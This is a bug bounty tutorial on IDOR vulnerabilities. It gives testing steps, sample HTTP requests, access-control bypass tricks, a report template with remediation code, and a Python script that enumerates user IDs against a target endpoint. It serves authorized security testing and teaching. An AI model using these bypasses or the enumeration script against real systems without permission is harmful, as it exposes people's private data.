# 🎯 IDOR Deep Dive: Insecure Direct Object References

**The #1 bug for beginners to find. Simple to test, high impact, consistent payouts.**

---

## What is IDOR?

**Insecure Direct Object Reference (IDOR)** occurs when an application provides direct access to objects based on user-supplied input. If the application doesn't properly check whether the user has permission to access the requested object, attackers can access unauthorized data.

### Real-World Example

```http
# You're logged in as User 123
GET /api/profile?user_id=123 HTTP/1.1

# Response shows YOUR profile
{
  "name": "John Doe",
  "email": "john@example.com",
  "ssn": "123-45-6789"
}

# What if you change the user_id to 124?
GET /api/profile?user_id=124 HTTP/1.1

# If vulnerable, you see SOMEONE ELSE's profile
{
  "name": "Jane Smith",
  "email": "jane@example.com",
  "ssn": "987-65-4321"
}
```

**This is IDOR**. You accessed Jane's data without authorization.

---

## Why IDOR is Perfect for Beginners

1. **Easy to Find** - Just change numbers in requests
2. **Easy to Test** - No complex payloads needed
3. **High Impact** - Direct data exposure
4. **Common** - Exists in 60%+ of applications
5. **Good Bounties** - $500-$5,000 typically

---

## Where to Find IDORs

### Common Locations

```http
# User profiles
/user/123
/profile?id=123
/api/users/123

# Orders and purchases
/order/456
/invoice/789
/api/orders/456

# Documents and files
/document/321
/download?file_id=654
/api/files/987

# Messages and notifications
/message/111
/api/notifications/222

# Admin functions
/admin/user/333
/api/admin/accounts/444
```

### URL Parameters

```
?id=123
?user_id=123
?account=123
?doc_id=123
?file=123
?order_id=123
?invoice=123
?uid=123
```

### API Endpoints

```
GET /api/v1/users/123
POST /api/v1/documents/456
PUT /api/v1/profile/789
DELETE /api/v1/orders/321
```

### JSON Bodies

```json
POST /api/update-profile
{
  "user_id": "123",
  "name": "John"
}
```

---

## Testing Methodology

### Step 1: Identify Object References

While browsing the application:
1. **Open Burp Suite** and set up proxy
2. **Browse normally** as authenticated user
3. **Look for numeric IDs** in:
   - URL parameters
   - API requests
   - JSON bodies
   - Cookies
   - Hidden form fields

### Step 2: Map Your Own Objects

Create multiple accounts (if allowed) or objects:

```bash
# Account 1: user_id=123
# Account 2: user_id=124

# Document 1: doc_id=456
# Document 2: doc_id=457

# Order 1: order_id=789
# Order 2: order_id=790
```

### Step 3: Test Cross-Account Access

**Basic Test:**
```http
# Logged in as User 123
GET /api/profile?user_id=123 → ✅ Your profile (expected)
GET /api/profile?user_id=124 → ❌ Should fail (check if it does)
GET /api/profile?user_id=1   → ❌ Admin? (always test)
```

**Create → Access Test:**
```
1. Account A creates Document X (id=100)
2. Account B tries to access Document X
   GET /api/document/100
3. If successful → IDOR!
```

### Step 4: Try Different HTTP Methods

```http
# Try all methods on the same endpoint
GET /api/user/123     → View user
PUT /api/user/123     → Update user?
POST /api/user/123    → Create/modify?
DELETE /api/user/123  → Delete user?
PATCH /api/user/123   → Partial update?
```

### Step 5: Try Different Formats

```http
# Numeric
/api/user/123

# GUID/UUID
/api/user/a1b2c3d4-e5f6-7890-abcd-ef1234567890

# Encoded
/api/user/MTIz (base64 of "123")

# Hash
/api/user/202cb962ac59075b964b07152d234b70 (MD5 of "123")

# Email
/api/user/user@example.com

# Username
/api/user/johndoe
```

---

## Advanced IDOR Testing

### 1. IDOR in POST Bodies

```http
POST /api/update-email HTTP/1.1
Content-Type: application/json

{
  "user_id": "123",        ← Change this
  "new_email": "new@email.com"
}

# Try changing user_id to update someone else's email
```

### 2. IDOR via Array Manipulation

```http
POST /api/get-profiles HTTP/1.1

{
  "user_ids": [123, 124, 125]  ← Request multiple users
}

# See if you can access profiles you shouldn't
```

### 3. IDOR with Parameter Pollution

```http
# Send multiple ID parameters
GET /api/profile?user_id=123&user_id=124

# Server might process the second one
# Or combine them in unexpected ways
```

### 4. Blind IDOR (No Direct Response)

```http
# You can't see the data, but action succeeds
DELETE /api/document/456

# Response: "Document deleted successfully"
# But was it YOUR document or someone else's?
```

**Test with:**
- Create document with Account A
- Try to delete with Account B
- Check with Account A if it's gone

### 5. IDOR via Referrer/Origin

```http
GET /api/user/123 HTTP/1.1
Referer: https://target.com/dashboard/user/124

# Some apps use Referer to determine access
```

### 6. Numeric ID Manipulation

```http
# Sequential IDs
/user/123 → /user/124 → /user/125

# Negative IDs
/user/-1 → /user/-2

# Very large IDs
/user/999999999

# Zero
/user/0

# Special numbers
/user/1 (likely admin)
```

### 7. GUID/UUID Manipulation

Even if IDs are GUIDs:
```
# Sometimes they're predictable
# Or leaked in other endpoints
# Or visible in emails/notifications

# Try common patterns:
00000000-0000-0000-0000-000000000000
00000000-0000-0000-0000-000000000001
```

---

## IDOR Bypass Techniques

### Bypass 1: Change Request Method

```http
# If GET is protected
GET /api/user/124 → 403 Forbidden

# Try POST
POST /api/user/124 → 200 OK (Vulnerable!)
```

### Bypass 2: Change Content-Type

```http
# Application/json blocked
POST /api/update-profile
Content-Type: application/json
{"user_id": "124"}
→ 403 Forbidden

# Try form data
POST /api/update-profile
Content-Type: application/x-www-form-urlencoded
user_id=124
→ 200 OK (Vulnerable!)
```

### Bypass 3: Add Extra Parameters

```http
# Direct access blocked
GET /api/user/124 → 403 Forbidden

# Add admin parameter
GET /api/user/124?admin=true → 200 OK
GET /api/user/124&isAdmin=1 → 200 OK
```

### Bypass 4: Wrap in Array

```http
# Single ID blocked
{"user_id": "124"} → 403 Forbidden

# Array works
{"user_id": ["124"]} → 200 OK
```

### Bypass 5: Path Traversal

```http
/api/user/123/../124
/api/user/123/../../admin/124
```

---

## Real-World IDOR Examples

### Example 1: Facebook Photo IDOR
**Bounty: $10,000**

```
Vulnerability: Access private photos of any user
Method: Manipulate photo_id in API request
Impact: Privacy violation of millions of users
```

### Example 2: Shopify Order Access
**Bounty: $500**

```http
GET /admin/orders/123.json

# Could access any order by changing ID
# Exposed: Customer names, addresses, purchases
```

### Example 3: Banking App Transaction IDOR
**Bounty: $15,000**

```http
GET /api/transactions?account_id=123456

# Changing account_id showed other customers' transactions
# Critical: Financial data exposure
```

### Example 4: Healthcare Portal IDOR
**Bounty: $8,000**

```http
GET /api/patient/records?patient_id=789

# Access to medical records of any patient
# HIPAA violation, critical severity
```

---

## Impact Assessment

### Low Impact ($100-$300)
- Information disclosure (non-sensitive)
- Public data access
- Logout other users

### Medium Impact ($500-$1,500)
- Private user profiles
- Order history
- Messages between users
- Document access

### High Impact ($2,000-$5,000)
- Financial information
- SSN/Tax documents
- Health records
- Admin functionality
- Mass data export

### Critical Impact ($5,000-$20,000)
- Full account takeover
- Payment method modification
- Database access
- GDPR/HIPAA violations

---

## How to Write an IDOR Report

### Title
```
IDOR allows accessing any user's profile via user_id parameter
```

### Summary
```
An Insecure Direct Object Reference vulnerability exists in the
/api/profile endpoint. By manipulating the user_id parameter, an
authenticated attacker can access the private profile information
of any user, including email, phone number, and address.
```

### Steps to Reproduce

```markdown
1. Log in as User A (user_id=123)
2. Navigate to your profile: https://target.com/profile
3. Intercept the request in Burp Suite:
   `GET /api/profile?user_id=123`
4. Change user_id from 123 to 124
5. Forward the request
6. Observe that User B's profile data is returned

**Expected**: 403 Forbidden or own profile only
**Actual**: User B's private profile data is returned
```

### Proof of Concept

```http
GET /api/profile?user_id=124 HTTP/1.1
Host: target.com
Cookie: session=user_A_session_token

Response:
{
  "user_id": "124",
  "name": "Victim User",
  "email": "victim@email.com",
  "phone": "+1234567890",
  "address": "123 Private St"
}
```

### Impact

```markdown
An attacker can:
- Enumerate all users (user_id 1 to 100000)
- Access private contact information
- Build a database of user data
- Target users for phishing
- Violate user privacy

Business Impact:
- GDPR violation (€20M fine potential)
- User trust compromised
- Regulatory compliance issues
```

### Remediation

```markdown
1. Implement proper authorization checks
2. Verify user_id belongs to authenticated user
3. Use session-based access control

Example fix:
```python
def get_profile(user_id):
    # Get authenticated user from session
    auth_user_id = session.get('user_id')

    # Check authorization
    if user_id != auth_user_id:
        return 403, "Unauthorized"

    # Return profile
    return get_user_profile(user_id)
```
```

---

## IDOR Testing Checklist

### Discovery
- [ ] Map all endpoints with object references
- [ ] Identify ID format (numeric, GUID, hash)
- [ ] Create multiple test accounts
- [ ] Create multiple test objects
- [ ] Note all ID parameters

### Testing
- [ ] Test with other user's ID
- [ ] Test with ID=1 (potential admin)
- [ ] Test with sequential IDs
- [ ] Test all HTTP methods (GET, POST, PUT, DELETE)
- [ ] Test different content types
- [ ] Test parameter pollution
- [ ] Test negative/zero IDs
- [ ] Test very large IDs

### Bypass Attempts
- [ ] Change HTTP method
- [ ] Change content-type
- [ ] Add extra parameters
- [ ] Wrap ID in array
- [ ] Encode the ID (base64, URL, hex)
- [ ] Use path traversal

### Documentation
- [ ] Screenshot original request
- [ ] Screenshot vulnerable request
- [ ] Note exact steps
- [ ] Assess impact
- [ ] Suggest remediation

---

## Automation Script

```python
#!/usr/bin/env python3
# IDOR Scanner - Test for basic IDOR vulnerabilities

import requests
import sys

def test_idor(base_url, endpoint, param, your_id, test_ids, cookies):
    """
    Test for IDOR vulnerability

    Args:
        base_url: https://target.com
        endpoint: /api/profile
        param: user_id
        your_id: 123 (your legitimate ID)
        test_ids: [124, 125, 1] (IDs to test)
        cookies: {'session': 'your_session_token'}
    """

    print(f"[*] Testing IDOR on {base_url}{endpoint}")
    print(f"[*] Parameter: {param}")
    print(f"[*] Your ID: {your_id}")
    print()

    # Test your own ID first (baseline)
    url = f"{base_url}{endpoint}?{param}={your_id}"
    resp = requests.get(url, cookies=cookies)
    your_response_length = len(resp.text)

    print(f"[+] Baseline request to your ID ({your_id}): {resp.status_code} - {your_response_length} bytes")
    print()

    # Test other IDs
    vulnerabilities = []

    for test_id in test_ids:
        url = f"{base_url}{endpoint}?{param}={test_id}"
        resp = requests.get(url, cookies=cookies)

        print(f"[>] Testing ID {test_id}: {resp.status_code} - {len(resp.text)} bytes")

        # Potential IDOR if:
        # 1. Status is 200
        # 2. Response length is similar to your own
        # 3. Response is not empty

        if resp.status_code == 200 and len(resp.text) > 100:
            if abs(len(resp.text) - your_response_length) < 500:  # Similar length
                print(f"[!] POTENTIAL IDOR: ID {test_id} returned 200 with similar response!")
                vulnerabilities.append(test_id)

    print()
    if vulnerabilities:
        print(f"[!] Found {len(vulnerabilities)} potential IDOR vulnerabilities!")
        print(f"[!] Vulnerable IDs: {vulnerabilities}")
        print("[!] Manually verify these findings!")
    else:
        print("[+] No obvious IDOR found. Try manual testing.")

if __name__ == "__main__":
    # Example usage
    test_idor(
        base_url="https://target.com",
        endpoint="/api/profile",
        param="user_id",
        your_id="123",
        test_ids=["124", "125", "1", "2", "100"],
        cookies={"session": "your_session_token"}
    )
```

---

## Practice Labs

1. **PortSwigger Web Security Academy**
   - Access control vulnerabilities
   - IDOR labs

2. **HackTheBox**
   - Various machines with IDOR

3. **PentesterLab**
   - IDOR exercises

---

## Common Mistakes

### ❌ Mistake 1: Not Testing Thoroughly
```
Only testing user_id=124
Not trying 1, 2, 100, 1000, etc.
```

### ❌ Mistake 2: Giving Up on 403
```
GET /api/user/124 → 403 Forbidden
(Gives up)

Should try: POST, PUT, different params, etc.
```

### ❌ Mistake 3: Poor Impact Description
```
"I can see other users"

Better: "I can access PII of 100,000 users including
SSN, addresses, and payment methods, violating GDPR"
```

### ❌ Mistake 4: Not Creating PoC
```
Just saying "IDOR exists"

Need: Exact steps, screenshots, actual data leak example
```

---

## Next Steps

1. **Pick a program** from your platform
2. **Map all endpoints** with IDs
3. **Create 2-3 test accounts**
4. **Test systematically** using this guide
5. **Document findings** clearly
6. **Submit high-quality report**

---

**IDOR is your gateway to bug bounty success. Master it first, then move to more complex vulnerabilities.**

**Happy hunting! 🎯**
